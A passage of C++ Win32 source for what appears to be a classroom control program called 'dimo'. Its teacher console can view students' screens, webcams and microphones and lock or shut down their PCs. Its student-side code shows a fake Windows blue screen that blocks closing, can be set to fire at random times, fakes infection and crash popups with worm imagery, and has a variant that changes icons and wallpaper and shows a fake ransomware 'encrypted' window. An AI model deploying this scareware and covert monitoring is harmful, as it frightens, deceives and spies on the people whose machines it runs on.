        c.pszText = (LPWSTR)L"角色";   c.cx = 90;  c.iSubItem = 1; ListView_InsertColumn(g_dmList, 1, &c);
        c.pszText = (LPWSTR)L"主机名"; c.cx = 380; c.iSubItem = 2; ListView_InsertColumn(g_dmList, 2, &c);
        c.pszText = (LPWSTR)L"IP 地址"; c.cx = 400; c.iSubItem = 3; ListView_InsertColumn(g_dmList, 3, &c);
        struct { int id; const wchar_t* t; } row1[] = {
            {DM_IDC_MON,    L"监视屏幕 (可操控)"}, {DM_IDC_CAM, L"监视摄像头"},
            {DM_IDC_MIC,    L"监听麦克风"},        {DM_IDC_SHOUT1, L"字幕喊话 (选中)"},
            {DM_IDC_SHOUT2, L"字幕喊话 (全体)"} };
        int x = 12;
        for (auto& b : row1) {
            CreateWindowExW(0, L"BUTTON", b.t, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                x, 376, 204, 36, h, (HMENU)(INT_PTR)b.id, nullptr, nullptr);
            x += 212;
        }
        struct { int id; const wchar_t* t; } row2[] = {
            {DM_IDC_VOICE,  L"🎤 语音喊话 (全体)"}, {DM_IDC_HLOCK, L"🔒 锁定屏幕 (硬)"},
            {DM_IDC_LOCK,   L"🖥 蓝屏整蛊 (软)"},   {DM_IDC_UNLOCK, L"🔓 远程解锁"},
            {DM_IDC_SHUT,   L"⏻ 远程关机"} };
        x = 12;
        for (auto& b : row2) {
            CreateWindowExW(0, L"BUTTON", b.t, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                x, 420, 204, 36, h, (HMENU)(INT_PTR)b.id, nullptr, nullptr);
            x += 212;
        }
        EnumChildWindows(h, dmSetFontCb, (LPARAM)hFontUI);
        SetTimer(h, 1, 1000, nullptr);
        return 0; }
    case WM_TIMER: {
        std::vector<DmPeer> ps; DWORD now = GetTickCount();
        {
            std::lock_guard<std::mutex> lk(g_dmMtx);
            for (auto it = g_dmPeers.begin(); it != g_dmPeers.end();)
                if (now - it->second.tick > 7000) it = g_dmPeers.erase(it); else ++it;
            for (auto& kv : g_dmPeers) if (kv.second.role != L"admin") ps.push_back(kv.second);
        }
        // 内容去重: 在线名单没变化就不重建列表/不重绘 (彻底防闪)
        std::wstring sig;
        for (auto& pe : ps) sig += pe.name + L"|" + dmIpStr(pe.ip) + L";";
        if (sig == g_dmDashSig) return 0;
        g_dmDashSig = sig;
        static std::vector<std::wstring> ips;
        SendMessageW(g_dmList, WM_SETREDRAW, FALSE, 0);
        ListView_DeleteAllItems(g_dmList);
        ips.clear();
        int n = 0;
        for (auto& pe : ps) {
            LVITEMW it{}; it.mask = LVIF_TEXT; it.iItem = n; it.pszText = (LPWSTR)pe.name.c_str();
            int idx = ListView_InsertItem(g_dmList, &it);
            ListView_SetItemText(g_dmList, idx, 1, (LPWSTR)pe.role.c_str());
            ListView_SetItemText(g_dmList, idx, 2, (LPWSTR)pe.host.c_str());
            ips.push_back(dmIpStr(pe.ip));
            ListView_SetItemText(g_dmList, idx, 3, (LPWSTR)ips[n].c_str());
            n++;
        }
        SendMessageW(g_dmList, WM_SETREDRAW, TRUE, 0);
        InvalidateRect(g_dmList, nullptr, FALSE);
        g_dmOnline = n;
        // 只重绘头部渐变区域 (防全窗口闪烁)
        RECT rc; GetClientRect(h, &rc);
        RECT hr = {0, 0, rc.right, 64};
        InvalidateRect(h, &hr, FALSE);
        return 0; }
    case WM_NOTIFY: {
        NMHDR* nm = (NMHDR*)l;
        if (nm->idFrom == DM_IDC_LIST && nm->code == NM_DBLCLK) {
            int i = ((NMITEMACTIVATE*)l)->iItem;
            if (i >= 0) {
                wchar_t b[64]; ListView_GetItemText(g_dmList, i, 0, b, 64);
                if (b[0]) dmOpenViewer(b, false);
            }
        }
        return 0; }
    case WM_COMMAND: {
        int i = (int)SendMessageW(g_dmList, LVM_GETNEXTITEM, -1, LVNI_SELECTED);
        wchar_t sel[64] = L"";
        if (i >= 0) ListView_GetItemText(g_dmList, i, 0, sel, 64);
        switch (LOWORD(w)) {
        case DM_IDC_MON:    if (sel[0]) dmOpenViewer(sel, false);
                            else MessageBoxW(h, L"请先在列表中选中一名学生。", L"dimo", MB_ICONWARNING); break;
        case DM_IDC_CAM:    if (sel[0]) dmOpenViewer(sel, true);
                            else MessageBoxW(h, L"请先在列表中选中一名学生。", L"dimo", MB_ICONWARNING); break;
        case DM_IDC_MIC:    if (sel[0]) dmOpenAudio(sel);
                            else MessageBoxW(h, L"请先在列表中选中一名学生。", L"dimo", MB_ICONWARNING); break;
        case DM_IDC_SHOUT1: dmOpenShout(false); break;
        case DM_IDC_SHOUT2: dmOpenShout(true); break;
        case DM_IDC_VOICE:  dmToggleVoice(h); break;
        case DM_IDC_LOCK:    dmOpenLockOpt(); break;
        case DM_IDC_HLOCK:   dmOpenCmdPick(L"dimo 锁定屏幕 (硬)", L"切换到 Windows 系统锁定界面 (开始菜单电源里的「锁定」)。\n注: 学生在锁屏界面按 Enter 可自行返回。", "HLOCK"); break;
        case DM_IDC_UNLOCK:  dmOpenCmdPick(L"dimo 远程解锁", L"解除蓝屏整蛊屏, 并取消尚未触发的定时, 对方桌面立即恢复。", "UNLOCK"); break;
        case DM_IDC_SHUT:    dmOpenCmdPick(L"dimo 远程关机", L"警告: 5 秒倒计时后真实关闭对方电脑!", "SHUT"); break;
        }
        return 0; }
    case WM_APP + 81: {   // 语音喊话线程退出: 复位按钮
        SetWindowTextW(GetDlgItem(h, DM_IDC_VOICE), L"🎤 语音喊话 (全体)");
        if (w == 1) MessageBoxW(h, L"本机麦克风打开失败, 无法语音喊话。", L"dimo", MB_ICONWARNING);
        return 0; }
    case WM_PAINT: {
        PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        Graphics g(dc);
        Rect hdr(0, 0, rc.right, 64);
        LinearGradientBrush br(hdr, Color(255, 63, 60, 155), Color(255, 92, 124, 250), 0.0f);
        g.FillRectangle(&br, hdr);
        SolidBrush wt(Color(255, 255, 255, 255));
        StringFormat sf;
        Font f1(L"Microsoft YaHei UI", 17, FontStyleBold);
        g.DrawString(L"dimo 课堂控制台", -1, &f1, RectF(22, 12, 400, 42), &sf, &wt);
        wchar_t st[160];
        wsprintfW(st, L"在线学生: %d    教师: %s", g_dmOnline, g_dmName.c_str());
        Font f2(L"Microsoft YaHei UI", 12, FontStyleBold);
        sf.SetAlignment(StringAlignmentFar);
        g.DrawString(st, -1, &f2, RectF((REAL)rc.right - 360, 20, 340, 28), &sf, &wt);
        EndPaint(h, &ps);
        return 0; }
    case WM_CLOSE: {
        for (DmViewer* v : g_dmViewers) { shutdown(v->s, SD_BOTH); closesocket(v->s); }
        DestroyWindow(h);
        return 0; }
    case WM_DESTROY: if (h == g_dmDash) g_dmDash = nullptr; return 0;
    }
    return DefWindowProcW(h, m, w, l);
}
void dmOpenDash() {
    dmEnsureClasses();
    if (g_dmDash) { ShowWindow(g_dmDash, SW_RESTORE); SetForegroundWindow(g_dmDash); return; }
    CreateWindowExW(0, L"DIMODASH", L"dimo 课堂控制台", WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
        CW_USEDEFAULT, CW_USEDEFAULT, 1108, 570, g_mainWnd, nullptr, g_hInst, nullptr);
    ShowWindow(g_dmDash, SW_SHOW);
}

// ------------------------------ 远程锁屏 (两种) / 关机 (学生端) ------------------------------
// 软锁 LOCK: 全屏伪装 Win11 蓝屏, 百分比忽快忽慢爬到 100% 后永久卡死 (整蛊);
//            教师端发 UNLOCK 后窗口销毁, 桌面恢复。
//   指令格式 (DMCMD 最后一段):
//     LOCK            立即触发
//     LOCK:T:a:b      延时触发, 随机落在 a~b 秒后
//     LOCK:C:m1:m2    定点触发, 随机落在当天 m1~m2 (0..1439 分钟) 之间
// 硬锁 HLOCK: 调 LockWorkStation 切到系统锁定界面 (开始菜单电源里的「锁定」)
static HWND g_dmLockWnd = nullptr;
extern "C" BOOL WINAPI LockWorkStation(void);

// Win11 蓝屏背景色
#define DM_BSOD_R 0x00
#define DM_BSOD_G 0x78
#define DM_BSOD_B 0xD7
#define DM_LOCK_TIMER 4242   // g_dmMsgWnd 上的定时触发定时器 ID

// ---- 整蛊序列引擎 (两版) 共享状态 ----
// 无害版: 闪退→黑屏→蓝屏→感染动画→错误窗群→重启动画 (约半分钟) → 直接恢复桌面 (不加最后蓝屏)
// 有害版: 同前段, 收尾改为 图标全变 classChat + 快捷方式占满桌面 + 骷髅壁纸
//         + 红色「电脑已被加密」小窗 (黄色正计时); 远程解锁即全部恢复 (全部可逆)
static HWND g_dmSeqWnd = nullptr;
static HWND g_dmRansomWnd = nullptr;
static bool g_dmHarm = false;              // 当前整蛊版本: false=无害版 true=有害版
static volatile LONG g_dmHarmApplied = 0;  // 有害效果已落盘 (图标/壁纸)
static volatile LONG g_dmHarmAbort = 0;    // 序列中途被解锁: 有害线程放弃落盘
static volatile LONG g_dmHarmDone = 0;     // 落盘线程已结束 (完成或中途放弃)
static std::vector<HWND> g_dmErrWins;      // 序列中弹出的错误窗口群
static void dmSeqErrCleanup();
static void dmHarmRestoreAsync();
static void dmStartSequence(bool harm);
static void dmShowRansom();
static DWORD WINAPI dmHarmThread(LPVOID);
static DWORD WINAPI dmHarmRestoreThread(LPVOID);
static DWORD WINAPI dmUnlockRollback(LPVOID);

// 简单确定性随机 (xorshift64), 避免额外 include
static unsigned long long dmRng() {
    static unsigned long long x = GetTickCount64() ^ 0x9E3779B97F4A7C15ull;
    if (!x) x = 0x123456789ABCDEF0ull;
    x ^= x << 13; x ^= x >> 7; x ^= x << 17;
    return x;
}
static long dmRand(long a, long b) { if (b < a) std::swap(a, b); return a + (long)(dmRng() % (unsigned long long)(b - a + 1)); }

// 伪二维码 (qr.png 缺失时的兜底): 固定种子生成 25x25 模块, 含三个定位角
static bool dmQrOn(int x, int y) {
    auto finder = [](int fx, int fy, int x, int y) {
        int dx = x - fx, dy = y - fy;
        if (dx < 0 || dy < 0 || dx > 6 || dy > 6) return -1;
        if (dx == 0 || dx == 6 || dy == 0 || dy == 6) return 1;
        if (dx >= 2 && dx <= 4 && dy >= 2 && dy <= 4) return 1;
        return 0;
    };
    if (finder(0, 0, x, y) >= 0)   return finder(0, 0, x, y) != 0;
    if (finder(18, 0, x, y) >= 0)  return finder(18, 0, x, y) != 0;
    if (finder(0, 18, x, y) >= 0)  return finder(0, 18, x, y) != 0;
    unsigned s = 2166136261u ^ (unsigned)(x * 73856093) ^ (unsigned)(y * 19349663);
    s ^= s << 13; s ^= s >> 17; s ^= s << 5;
    return (s & 1) != 0;
}

static void dmDrawQrFallback(Graphics& g, REAL x, REAL y, REAL side) {
    REAL m = side / 25.0f;
    SolidBrush wt(Color(255, 255, 255));
    g.FillRectangle(&wt, x - 6, y - 6, side + 12, side + 12);
    SolidBrush bl(Color(255, 0, 0, 0));
    for (int iy = 0; iy < 25; ++iy)
        for (int ix = 0; ix < 25; ++ix)
            if (dmQrOn(ix, iy))
                g.FillRectangle(&bl, x + ix * m, y + iy * m, m + 0.6f, m + 0.6f);
}

// 从 exe 同目录 qr.png 加载二维码图片 (失败返回 nullptr, 调用方用兜底图案)
static Image* dmLoadQrImage() {
    static Image* s_img = nullptr;
    static bool s_tried = false;
    if (s_tried) return s_img;
    s_tried = true;
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    wchar_t* slash = wcsrchr(path, L'\\');
    if (slash) lstrcpynW(slash + 1, L"qr.png", MAX_PATH - (int)(slash + 1 - path));
    else return nullptr;
    if (GetFileAttributesW(path) == INVALID_FILE_ATTRIBUTES) return nullptr;
    s_img = Image::FromFile(path, FALSE);
    if (s_img && s_img->GetLastStatus() != Ok) { delete s_img; s_img = nullptr; }
    return s_img;
}

static LRESULT CALLBACK dmLockProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    static int       s_pct = 0;          // 当前百分比
    static ULONGLONG s_nextTick = 0;     // 下一格的时间点
    static RECT      s_pctRc{};          // 百分比文字区域 (只重绘这里, 不闪)
    switch (m) {
    case WM_CREATE:
        s_pct = 0;
        s_nextTick = GetTickCount64() + dmRand(300, 900);   // 第一格来得快一点
        s_pctRc = {0, 0, 0, 0};
        SetTimer(h, 1, 250, nullptr);    // 进度推进检查
        SetTimer(h, 2, 2000, nullptr);   // 定期保持置顶 (不抢前台, 不触发重绘)
        return 0;
    case WM_TIMER:
        if (w == 2) {
            SetWindowPos(h, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
            return 0;
        }
        if (s_pct < 100 && GetTickCount64() >= s_nextTick) {
            ++s_pct;
            // 平均 2 秒 / 1%, 在 0.5~3.5 秒之间随机, 表现为忽快忽慢
            s_nextTick = GetTickCount64() + dmRand(500, 3500);
            InvalidateRect(h, &s_pctRc, FALSE);   // 只重绘百分比那一小块
            if (s_pct >= 100) KillTimer(h, 1);    // 到 100% 彻底静止
        }
        return 0;
    case WM_CLOSE: case WM_QUERYENDSESSION: return 0;   // 拦截关闭 (Alt+F4)
    case WM_SYSCOMMAND: return 0;
    case WM_ERASEBKGND: return 1;                        // 不自擦背景, 防闪
    case WM_PAINT: {
        PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        Graphics g(dc);
        SolidBrush bg(Color(255, DM_BSOD_R, DM_BSOD_G, DM_BSOD_B));
        g.FillRectangle(&bg, 0, 0, rc.right, rc.bottom);
        SolidBrush wt(Color(255, 255, 255, 255));
        Font fFace(L"Segoe UI", 106, FontStyleRegular);
        Font fBody(L"Microsoft YaHei UI", 21, FontStyleRegular);
        Font fPct(L"Microsoft YaHei UI", 21, FontStyleRegular);
        Font fSmall(L"Microsoft YaHei UI", 12, FontStyleRegular);
        REAL ml = (REAL)(rc.right / 12 > 90 ? rc.right / 12 : 90);
        REAL cw = std::min((REAL)(rc.right - 2 * ml), 860.0f);
        // ---- 蓝屏: :( + 错误说明 + 完成百分比 + 底部二维码/停止代码 ----
        REAL y = rc.bottom * 0.16f;
        g.DrawString(L":(", -1, &fFace, PointF(ml, y), &wt);
        y += 150;
        RectF body(ml, y, cw, 150);
        g.DrawString(L"你的设备遇到问题，需要重新启动。\n我们只收集某些错误信息，然后你可以重新启动。",
            -1, &fBody, body, nullptr, &wt);
        y += 130;
        wchar_t buf[32]; swprintf(buf, 32, L"%d%% 完成", s_pct);
        g.DrawString(buf, -1, &fPct, PointF(ml, y), &wt);
        s_pctRc.left = (int)ml - 6; s_pctRc.top = (int)y - 4;
        s_pctRc.right = (int)ml + 200; s_pctRc.bottom = (int)y + 38;
        REAL qy = rc.bottom - (REAL)(rc.bottom / 8 > 170 ? rc.bottom / 8 : 170) - 130;
        Image* qr = dmLoadQrImage();
        REAL qh = 120;
        if (qr && qr->GetWidth() > 0) qh = 120.0f * (REAL)qr->GetHeight() / (REAL)qr->GetWidth();
        if (qr) g.DrawImage(qr, ml, qy, 120.0f, qh);
        else    dmDrawQrFallback(g, ml, qy, 120);
        StringFormat lf; lf.SetAlignment(StringAlignmentNear); lf.SetLineAlignment(StringAlignmentCenter);
        RectF info(ml + 150, qy - 10, cw - 150, (std::max)(140.0f, qh));
        SolidBrush dim(Color(235, 255, 255, 255));
        g.DrawString(L"有关此问题的详细信息和可能的修复方法，请访问\n"
                     L"https://www.windows.com/stopcode\n\n"
                     L"如果你致电支持人员，请向他们提供以下信息:\n"
                     L"停止代码: CRITICAL_PROCESS_DIED",
            -1, &fSmall, info, &lf, &dim);
        EndPaint(h, &ps);
        return 0; }
    case WM_DESTROY:
        KillTimer(h, 1); KillTimer(h, 2);
        if (h == g_dmLockWnd) g_dmLockWnd = nullptr;
        return 0;
    }
    return DefWindowProcW(h, m, w, l);
}
static void dmShowLock() {
    if (g_dmLockWnd) return;
    int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
    g_dmLockWnd = CreateWindowExW(WS_EX_TOPMOST, L"DIMOLOCK", L"", WS_POPUP,
        0, 0, sw, sh, nullptr, nullptr, g_hInst, nullptr);
    ShowWindow(g_dmLockWnd, SW_SHOWMAXIMIZED);
    SetForegroundWindow(g_dmLockWnd);
    MessageBeep(MB_ICONWARNING);
}
static void dmHideLock() {
    if (g_dmMsgWnd) KillTimer(g_dmMsgWnd, DM_LOCK_TIMER);   // 取消尚未触发的定时
    InterlockedExchange(&g_dmHarmAbort, 1);                 // 有害线程未落盘则放弃
    if (g_dmSeqWnd) DestroyWindow(g_dmSeqWnd);              // 序列中途解锁: 引擎窗+错误窗群一并清
    if (g_dmLockWnd) { DestroyWindow(g_dmLockWnd); g_dmLockWnd = nullptr; }
    if (g_dmRansomWnd) { DestroyWindow(g_dmRansomWnd); g_dmRansomWnd = nullptr; }
    if (g_dmHarm) {                                         // 有害版: 无条件延迟回滚 (幂等),
        CloseHandle(CreateThread(nullptr, 0, dmUnlockRollback, nullptr, 0, nullptr));
    }                                                       // 覆盖落盘线程任何进度, 杜绝壁纸/图标残留
}

// 学生端: 解析教师的 LOCK 触发参数并安排整蛊序列
//   "LOCK[:H]" 立即; "LOCK[:H]:T:a:b" 延时 a~b 秒; "LOCK[:H]:C:m1:m2" 当天 m1~m2 分钟之间
//   H = 有害版 (默认无害版)
static void dmArmLock(const char* spec) {
    if (!g_dmMsgWnd) return;
    KillTimer(g_dmMsgWnd, DM_LOCK_TIMER);
    char tmp[96]; strncpy(tmp, spec ? spec : "LOCK", sizeof(tmp) - 1); tmp[sizeof(tmp) - 1] = 0;
    char* tok0 = strtok(tmp, ":");
    if (!tok0 || strncmp(tok0, "LOCK", 4) != 0) { g_dmHarm = false; dmStartSequence(false); return; }
    char* tk = strtok(nullptr, ":");
    bool harm = false;
    if (tk && tk[0] == 'H' && !tk[1]) { harm = true; tk = strtok(nullptr, ":"); }
    g_dmHarm = harm;
    unsigned waitMs = 0;
    if (!tk) { dmStartSequence(harm); return; }   // 无定时参数: 立即
    if (tk[0] == 'T') {
        char* p2 = strtok(nullptr, ":");
        char* p3 = strtok(nullptr, ":");
        if (!p2 || !p3) { dmStartSequence(harm); return; }
        long a = atol(p2), b = atol(p3);
        if (a < 0) a = 0; if (b > 86400) b = 86400;
        waitMs = (unsigned)(dmRand(a, b) * 1000);
    } else if (tk[0] == 'C') {
        char* p2 = strtok(nullptr, ":");
        char* p3 = strtok(nullptr, ":");
        if (!p2 || !p3) { dmStartSequence(harm); return; }
        long m1 = atol(p2), m2 = atol(p3);
        if (m1 < 0 || m1 > 1439 || m2 < 0 || m2 > 1439) { dmStartSequence(harm); return; }
        long span = (m2 - m1 + 1440) % 1440;           // 支持跨午夜
        long target = m1 + (span ? dmRand(0, span - 1) : 0);
        SYSTEMTIME st; GetLocalTime(&st);
        long nowMs = (st.wHour * 60L + st.wMinute) * 60000L + st.wSecond * 1000L + st.wMilliseconds;
        long targetMs = target * 60000L + dmRand(0, 59) * 1000L;
        long wait = targetMs - nowMs;
        if (wait < 0) wait += 86400000L;
        waitMs = (unsigned)wait;
    } else { dmStartSequence(harm); return; }
    SetTimer(g_dmMsgWnd, DM_LOCK_TIMER, waitMs ? waitMs : 1, nullptr);
}

// ---------------- 整蛊序列引擎 (两版共用): 闪退→黑屏→蓝屏→感染→错误窗→重启→收尾 ----------------
static const wchar_t* kDmErrTexts[] = {
    L"应用程序无法正常启动 (0xc000007b)。\n请单击“确定”关闭应用程序。",
    L"explorer.exe 已停止工作。\n出现问题导致程序停止正常工作。",
    L"未处理异常: 0xE0434352\n模块: KERNELBASE.dll",
    L"文件或目录已损坏且无法读取。",
    L"句柄无效。(异常来自 HRESULT: 0x80070006)",
    L"系统资源不足, 无法完成请求的服务。",
    L"磁盘结构损坏且无法读取。",
    L"指令引用的 0x00000000 内存。该内存不能为 written。",
};
// 错误弹窗 (真窗口, 阶段结束统一销毁; 手动关掉单个也无妨)
static LRESULT CALLBACK dmErrProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    switch (m) {
    case WM_CREATE:
        SetWindowLongPtrW(h, GWLP_USERDATA, (LONG_PTR)((CREATESTRUCTW*)l)->lpCreateParams);
        SetWindowPos(h, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
        return 0;
    case WM_CLOSE: DestroyWindow(h); return 0;
    case WM_ERASEBKGND: return 1;
    case WM_PAINT: {
        PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
        RECT rc; GetClientRect(h, &rc);
        HBRUSH wbr = CreateSolidBrush(RGB(255, 255, 255));
        FillRect(dc, &rc, wbr);
        HBRUSH rbr = CreateSolidBrush(RGB(0xE8, 0x11, 0x23));
        HBRUSH obr = (HBRUSH)SelectObject(dc, rbr);
        Ellipse(dc, 22, 36, 62, 76);
        SelectObject(dc, obr);
        DeleteObject(rbr);
        HPEN wp = CreatePen(PS_SOLID, 4, RGB(255, 255, 255));
        HPEN op = (HPEN)SelectObject(dc, wp);
        MoveToEx(dc, 31, 45, nullptr); LineTo(dc, 53, 67);
        MoveToEx(dc, 53, 45, nullptr); LineTo(dc, 31, 67);
        SelectObject(dc, op);
        DeleteObject(wp);
        SetBkMode(dc, TRANSPARENT);
        SetTextColor(dc, RGB(20, 20, 20));
        SelectObject(dc, hFontUI);
        RECT tr = {74, 28, rc.right - 14, rc.bottom - 56};
        DrawTextW(dc, (const wchar_t*)GetWindowLongPtrW(h, GWLP_USERDATA), -1, &tr, DT_WORDBREAK | DT_LEFT);
        RECT bb = {rc.right - 96, rc.bottom - 40, rc.right - 16, rc.bottom - 12};
        FrameRect(dc, &bb, (HBRUSH)GetStockObject(GRAY_BRUSH));
        DrawTextW(dc, L"确定", -1, &bb, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        DeleteObject(wbr);
        EndPaint(h, &ps);
        return 0; }
    case WM_LBUTTONDOWN: return 0;
    }
    return DefWindowProcW(h, m, w, l);
}
static void dmSeqErrCleanup() {
    std::vector<HWND> ws;
    ws.swap(g_dmErrWins);
    for (HWND e : ws) if (IsWindow(e)) DestroyWindow(e);
}

// 序列引擎全屏窗: 单定时器 40ms 推进所有阶段, 只重绘变化的小区域 (防全屏闪烁)
static std::wstring dmPandaPath();   // 前向: 熊猫烧香壁纸路径 (定义在落盘区)
static LRESULT CALLBACK dmSeqProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    static int s_phase = 0;            // 0闪退 1黑屏 2蓝屏 3感染 4错误窗 5重启 6等落盘
    static ULONGLONG s_t0 = 0, s_evt = 0, s_evt2 = 0;
    static RECT s_flash{};
    static bool s_flashOn = false, s_bsodDrawn = false;
    static int s_pct = 0, s_row = 0, s_reboot = 0;
    static ULONGLONG s_pctNext = 0;
    static bool s_harmStarted = false;
    static bool s_pandaInit = false, s_redWait = false;
    static HFONT s_fMono = nullptr;
    switch (m) {
    case WM_CREATE:
        s_phase = 0; s_t0 = GetTickCount64(); s_evt = 0; s_evt2 = 0;
        s_flash = {0, 0, 0, 0}; s_flashOn = false; s_bsodDrawn = false;
        s_pct = 0; s_row = 0; s_reboot = 0; s_harmStarted = false;
        s_pctNext = 0; s_pandaInit = false; s_redWait = false;
        s_fMono = CreateFontW(-15, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET,
                              OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
                              FIXED_PITCH | FF_MODERN, L"Consolas");
        SetTimer(h, 1, 40, nullptr);
        MessageBeep(MB_ICONWARNING);
        return 0;
    case WM_CLOSE: case WM_QUERYENDSESSION: return 0;   // 拦截关闭
    case WM_SYSCOMMAND: return 0;
    case WM_ERASEBKGND: return 1;
    case WM_TIMER: {
        ULONGLONG now = GetTickCount64();
        HDC dc = GetDC(h);
        RECT rc; GetClientRect(h, &rc);
        auto fillAll = [&](COLORREF c) {
            HBRUSH b = CreateSolidBrush(c);
            RECT r = {0, 0, rc.right, rc.bottom};
            FillRect(dc, &r, b);
            DeleteObject(b);
        };
        auto finishTo = [&](int keepPhase) {
            ReleaseDC(h, dc);
            if (keepPhase == 0) {          // 无害版收尾: 不加最后蓝屏, 直接结束恢复桌面
                s_phase = 9;
                DestroyWindow(h);
            } else {                       // 有害版收尾: 直接弹红色加密窗 (落盘可能仍在后台)
                s_phase = 9;
                DestroyWindow(h);
                dmShowRansom();
            }
            return 0;
        };
        switch (s_phase) {
        case 0: {   // ---- 窗口闪退: 假窗口快速弹出又消失 ----
            if (!s_flashOn && now >= s_evt) {
                int fw = dmRand(300, 520), fh = dmRand(200, 340);
                s_flash.left = dmRand(0, rc.right > fw ? rc.right - fw : 0);
                s_flash.top = dmRand(0, rc.bottom > fh ? rc.bottom - fh : 0);
                s_flash.right = s_flash.left + fw;
                s_flash.bottom = s_flash.top + fh;
                HBRUSH g1 = CreateSolidBrush(RGB(55, 55, 55));
                FillRect(dc, &s_flash, g1); DeleteObject(g1);
                HBRUSH t1 = CreateSolidBrush(RGB(225, 225, 225));
                RECT tb = {s_flash.left, s_flash.top, s_flash.right, s_flash.top + 30};
                FillRect(dc, &tb, t1); DeleteObject(t1);
                SetBkMode(dc, TRANSPARENT); SetTextColor(dc, RGB(30, 30, 30));
                SelectObject(dc, hFontUI);
                RECT tr = {s_flash.left + 8, s_flash.top + 6, s_flash.right - 30, s_flash.top + 28};
                DrawTextW(dc, L"explorer.exe", -1, &tr, DT_LEFT | DT_SINGLELINE);
                s_flashOn = true;
                s_evt = now + dmRand(120, 260);   // "闪退": 稍后消失
            } else if (s_flashOn && now >= s_evt) {
                HBRUSH b = CreateSolidBrush(RGB(0, 0, 0));
                FillRect(dc, &s_flash, b); DeleteObject(b);
                s_flashOn = false;
                s_evt = now + dmRand(260, 620);
            }
            if (now - s_t0 > 3500) {
                s_phase = 1; s_t0 = now; s_evt = 0; s_evt2 = 0;
                fillAll(RGB(0, 0, 0));
            }
            break; }
        case 1: {   // ---- 频繁黑屏: 黑底 + 偶发故障噪线 ----
            if (now >= s_evt) {
                if (s_evt2 <= now) { fillAll(RGB(0, 0, 0)); s_evt2 = now + dmRand(900, 1500); }
                for (int i = 0; i < 3; ++i) {
                    int y = dmRand(0, rc.bottom);
                    RECT n = {0, y, rc.right, y + dmRand(1, 3)};
                    BYTE v = (BYTE)dmRand(25, 75);
                    HBRUSH b = CreateSolidBrush(RGB(v, v, v));
                    FillRect(dc, &n, b); DeleteObject(b);
                }
                s_evt = now + dmRand(60, 200);
            }
            if (now - s_t0 > 4000) {
                s_phase = 2; s_t0 = now; s_pct = 0; s_bsodDrawn = false;
                fillAll(RGB(DM_BSOD_R, DM_BSOD_G, DM_BSOD_B));
            }
            break; }
        case 2: {   // ---- 蓝屏 (简版脸): 百分比快速爬到 ~47% 切下一阶段 ----
            REAL ml = (REAL)(rc.right / 12 > 90 ? rc.right / 12 : 90);
            REAL py = rc.bottom * 0.18f + 200;
            if (!s_bsodDrawn) {
                s_bsodDrawn = true;
                Graphics g(dc);
                SolidBrush wt(Color(255, 255, 255, 255));
                Font fFace(L"Segoe UI", 96, FontStyleRegular);
                Font fBody(L"Microsoft YaHei UI", 20, FontStyleRegular);
                g.DrawString(L":(", -1, &fFace, PointF(ml, rc.bottom * 0.18f), &wt);
                g.DrawString(L"你的设备遇到问题，需要重新启动。", -1, &fBody,
                             PointF(ml, rc.bottom * 0.18f + 140), &wt);
            }
            if (s_pct < 15 && now >= s_pctNext) {
                RECT pr = {(int)ml - 6, (int)py - 6, (int)ml + 220, (int)py + 40};
                HBRUSH bb2 = CreateSolidBrush(RGB(DM_BSOD_R, DM_BSOD_G, DM_BSOD_B));
                FillRect(dc, &pr, bb2); DeleteObject(bb2);   // 先抹掉旧百分比 (不闪)
                ++s_pct;
                Graphics g(dc);
                SolidBrush wt(Color(255, 255, 255, 255));
                Font fBody(L"Microsoft YaHei UI", 20, FontStyleRegular);
                wchar_t b[32]; swprintf(b, 32, L"%d%% 完成", s_pct);
                g.DrawString(b, -1, &fBody, PointF(ml, py), &wt);
                s_pctNext = now + dmRand(60, 260);
            }
            if (now - s_t0 > 3200) {   // 蓝屏段缩短 (约 3s), 快速切熊猫弹出阶段
                s_phase = 10; s_t0 = now; s_evt = 0;
                fillAll(RGB(0, 0, 0));
            }
            break; }
        case 10: {   // ---- 熊猫弹出: 全屏不断弹出大大小小的熊猫烧香图 ----
            static ULONGLONG s_popNext = 0;
            if (s_evt == 0) { s_evt = 1; s_popNext = now; }
            HBRUSH fb = CreateSolidBrush(RGB(0, 0, 0));
            RECT fr = {0, 0, rc.right, rc.bottom};
            FillRect(dc, &fr, fb);
            DeleteObject(fb);
            // 每 ~60ms 在随机位置生成一只随机大小的熊猫
            if (now >= s_popNext) {
                s_popNext = now + 55;
                Gdiplus::Image* panda = Gdiplus::Image::FromFile(dmPandaPath().c_str());
                if (panda && panda->GetLastStatus() == Ok) {
                    int minS = (rc.bottom < rc.right ? rc.bottom : rc.right) / 18;
                    int maxS = (rc.bottom < rc.right ? rc.bottom : rc.right) / 2;
                    int s = dmRand(minS, maxS);
                    int x = dmRand(0, rc.right - s);
                    int y = dmRand(0, rc.bottom - s);
                    Graphics g(dc);
                    g.DrawImage(panda, x, y, s, s);
                }
                delete panda;
            }
            if (now - s_t0 > 4200) {   // 熊猫弹出约 4s 后切感染动画
                s_phase = 3; s_t0 = now; s_evt = 0; s_row = 0;
                fillAll(RGB(0, 0, 0));
            }
            break; }
        case 3: {   // ---- 熊猫烧香 + 恐怖闪烁: 熊猫举三炷香、感染名单滚动、偶发红屏惊吓 ----
            int cx = rc.right / 2, cy = (int)(rc.bottom * 0.40);
